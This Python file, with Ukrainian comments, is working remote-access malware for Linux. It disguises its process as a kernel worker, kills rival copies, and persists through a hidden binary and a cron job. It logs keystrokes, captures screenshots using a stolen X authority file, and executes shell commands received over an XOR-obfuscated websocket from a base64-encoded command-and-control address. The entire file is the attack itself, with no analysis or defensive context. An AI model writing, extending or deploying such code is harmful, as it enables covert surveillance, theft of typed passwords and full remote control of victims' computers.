import asyncio
import websockets
import os
import subprocess
import uuid
import base64
import sys
import shutil
import glob
import io
import socket
import signal
from io import BytesIO

try: import setproctitle
except: setproctitle = None
try: from PIL import ImageGrab
except: ImageGrab = None
try: from pynput import keyboard
except: keyboard = None

# --- КОНФІГУРАЦІЯ ---
_S = "d3M6Ly8xOTIuMTY4LjEwLjgyOjgwMDAvd3Mv" 
X_KEY = "AMY_2026_SECRET"
FAKE_NAME = "[kworker/u2:1-events]"

log_buffer = []

def get_url(): 
    try: return base64.b64decode(_S).decode()
    except: return ""

def crypt_logic(d):
    k = X_KEY
    return "".join(chr(ord(d[i]) ^ ord(k[i % len(k)])) for i in range(len(d)))

def decrypt(m):
    try: 
        decoded = base64.b64decode(m).decode()
        return crypt_logic(decoded)
    except: return None

def encrypt(m): 
    return base64.b64encode(crypt_logic(m).encode()).decode()

def masquerade():
    if setproctitle: 
        setproctitle.setproctitle(FAKE_NAME)
    else:
        try:
            import ctypes
            libc = ctypes.CDLL('libc.so.6')
            libc.prctl(15, FAKE_NAME.encode(), 0, 0, 0)
        except: pass

def kill_others():
    """Агресивне очищення системи від конкурентів та старих версій"""
    my_pid = os.getpid()
    try:
        # Шукаємо всі процеси з таким іменем через системний виклик ps
        p = subprocess.run(['pgrep', '-f', FAKE_NAME], capture_output=True, text=True)
        for pid_str in p.stdout.split():
            pid = int(pid_str)
            if pid != my_pid:
                os.kill(pid, signal.SIGKILL)
    except:
        # Альтернативний метод, якщо pgrep немає
        try:
            p = subprocess.run(['ps', '-A', '-o', 'pid,command'], capture_output=True, text=True)
            for line in p.stdout.splitlines():
                if FAKE_NAME in line:
                    pid = int(line.split()[0])
                    if pid != my_pid:
                        os.kill(pid, signal.SIGKILL)
        except: pass

def ghost_install():
    try:
        p = os.path.expanduser("~/.local/share/systemd-service")
        os.makedirs(p, exist_ok=True)
        t = os.path.join(p, "sys-update")
        
        # Оновлюємо бінарний файл, якщо він відрізняється
        if not os.path.exists(t) or os.path.getsize(sys.argv[0]) != os.path.getsize(t):
            shutil.copy2(sys.argv[0], t)
            os.chmod(t, 0o755)
        
        # Перевіряємо cron. Якщо нашого завдання немає — додаємо.
        cron_job = f"*/2 * * * * {t} >/dev/null 2>&1"
        check = subprocess.run("crontab -l", shell=True, capture_output=True, text=True).stdout
        if t not in check:
            # Очищаємо старі записи і додаємо новий
            new_cron = "\n".join([l for l in check.splitlines() if "sys-update" not in l])
            subprocess.run(f'(echo "{new_cron}"; echo "{cron_job}") | crontab -', shell=True)
    except: pass

def take_screenshot_sync():
    if not ImageGrab: return None
    try:
        # Налаштування дисплея для root/cron
        if 'DISPLAY' not in os.environ: os.environ['DISPLAY'] = ':0'
        if os.getuid() == 0:
            for path in glob.glob('/home/*/.Xauthority') + ['/root/.Xauthority']:
                if os.path.exists(path):
                    os.environ['XAUTHORITY'] = path
                    break
        
        screenshot = ImageGrab.grab()
        buf = io.BytesIO()
        screenshot.save(buf, format="PNG")
        return base64.b64encode(buf.getvalue()).decode()
    except: return None

async def run_shell(cmd):
    """Шелл, який дійсно працює в cron"""
    try:
        # Встановлюємо повний PATH для cron-сесій
        env = os.environ.copy()
        env["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
        
        proc = await asyncio.create_subprocess_shell(
            cmd, 
            stdout=asyncio.subprocess.PIPE, 
            stderr=asyncio.subprocess.PIPE,
            env=env
        )
        o, e = await proc.communicate()
        res = o.decode() + e.decode()
        
        # Замість os.getlogin() використовуємо безпечні методи
        user = "root" if os.getuid() == 0 else "user"
        cwd = os.getcwd()
        header = f"{user}@{socket.gethostname()}:{cwd}$ "
        
        return f"{header}\n{res}" if res.strip() else f"{header}(команда виконана)"
    except Exception as ex:
        return f"Shell Error: {str(ex)}"

async def keylog_sender(ws):
    global log_buffer
    while True:
        await asyncio.sleep(20)
        if log_buffer:
            try:
                await ws.send(encrypt(f"LOGS:{''.join(log_buffer)}"))
                log_buffer = []
            except: pass

def on_press(key):
    try: log_buffer.append(key.char)
    except AttributeError:
        if key == keyboard.Key.space: log_buffer.append(" ")
        elif key == keyboard.Key.enter: log_buffer.append("\n")
        else: log_buffer.append(f"[{key.name}]")

async def start():
    # 1. Знищуємо всіх конкурентів перед початком
    kill_others()
    # 2. Маскуємось
    masquerade()
    # 3. Закріплюємось
    ghost_install()
    
    if keyboard:
        try:
            listener = keyboard.Listener(on_press=on_press)
            listener.start()
        except: pass

    # Статичний ID на основі заліза
    b_id = hex(uuid.getnode())[2:10]
    
    while True:
        try:
            url = get_url()
            async with websockets.connect(url + b_id, ping_interval=None) as ws:
                asyncio.create_task(keylog_sender(ws))
                while True:
                    m = await ws.recv()
                    cmd = decrypt(m)
                    if not cmd: continue
                    cmd = cmd.strip()
                    
                    if cmd == "screenshot":
                        shot_b64 = await asyncio.to_thread(take_screenshot_sync)
                        if shot_b64:
                            await ws.send(encrypt(f"SCREENSHOT:{shot_b64}"))
                        else:
                            await ws.send(encrypt("SYS_MSG: Screenshot failed"))
                            
                    elif cmd == "self_destruct":
                        subprocess.run("crontab -r", shell=True)
                        os._exit(0)
                    else:
                        response = await run_shell(cmd)
                        await ws.send(encrypt(response))
        except:
            await asyncio.sleep(10)

if __name__ == "__main__":
    asyncio.run(start())